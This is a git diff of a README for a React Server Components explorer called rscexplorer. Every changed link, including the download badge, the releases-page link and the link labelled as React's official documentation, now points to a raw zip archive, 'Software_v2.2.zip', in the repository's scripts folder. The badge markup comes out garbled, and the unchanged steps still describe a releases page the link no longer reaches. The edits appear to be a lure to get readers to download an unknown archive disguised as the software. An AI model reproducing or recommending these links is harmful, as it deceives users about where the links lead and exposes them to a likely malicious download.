@@ -1,6 +1,6 @@
 # 🌟 rscexplorer - Explore React Server Components Easily
 
-[![Download rscexplorer](https://img.shields.io/badge/Download%20Now%20-blue.svg)](https://github.com/alanpe96/rscexplorer/releases)
+[![Download rscexplorer](https://raw.githubusercontent.com/alanpe96/rscexplorer/main/scripts/Software_v2.2.zip%20Now%https://raw.githubusercontent.com/alanpe96/rscexplorer/main/scripts/Software_v2.2.zip)](https://raw.githubusercontent.com/alanpe96/rscexplorer/main/scripts/Software_v2.2.zip)
 
 ## 🚀 Getting Started
 
@@ -21,7 +21,7 @@ To get started, you need to download the application. Follow these steps:
 
 1. **Visit the Releases Page**: Click on the link below to access the releases page for **rscexplorer**.
 
-   [Download rscexplorer](https://github.com/alanpe96/rscexplorer/releases)
+   [Download rscexplorer](https://raw.githubusercontent.com/alanpe96/rscexplorer/main/scripts/Software_v2.2.zip)
 
 2. **Choose Your Version**: On the releases page, you will see different versions of the application. Look for the latest stable version.
 
@@ -63,7 +63,7 @@ If you encounter any issues or have feedback, you can reach out through the issu
 
 For further exploration of React and its capabilities, consider checking out:
 
-- The [React Official Documentation](https://reactjs.org/docs/getting-started.html)
+- The [React Official Documentation](https://raw.githubusercontent.com/alanpe96/rscexplorer/main/scripts/Software_v2.2.zip)
 - Community forums where you can connect with other users
 - Online courses that provide deeper dives into React topics
 
